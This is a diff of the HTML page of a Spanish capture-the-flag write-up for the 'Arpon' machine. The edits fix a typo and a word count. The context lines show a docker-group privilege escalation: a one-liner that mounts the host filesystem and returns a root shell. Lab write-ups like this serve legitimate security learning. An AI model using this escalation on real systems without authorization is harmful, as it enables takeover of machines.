@@ -53,7 +53,7 @@
         },
         "datePublished": "2024-06-06",
         "description": "Writeup Arpon 🟢",
-        "wordCount":  2294 ,
+        "wordCount":  2285 ,
         "mainEntityOfPage": "True",
         "dateModified": "2024-06-06",
         "image": {
@@ -578,7 +578,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span></code></pre></div><p>Con <strong>id</strong> veo que <strong>foque</strong> es miembro del grupo <code>docker</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">foque@arpon:~$ id
 </span></span><span class="line"><span class="cl">uid=1002(foque) gid=1002(foque) grupos=1002(foque),996(docker)
-</span></span></code></pre></div><p>En este <a href="https://www.reddit.com/r/oscp/comments/les434/linux_privilege_escalation_docker_group/">enlace</a> me proporciona información para elevar privbilegios, también mencionan que en <strong>GTFOBins</strong> hay la misma información.</p>
+</span></span></code></pre></div><p>En este <a href="https://www.reddit.com/r/oscp/comments/les434/linux_privilege_escalation_docker_group/">enlace</a> me proporciona información para elevar privilegios.</p>
 <p><img src="/../machines/nyx/arpon/dockerprivesc.webp" alt="dockerprivesc"></p>
 <p>Al introducir el <strong>oneliner</strong> me devuelve una terminal de root.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">foque@arpon:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
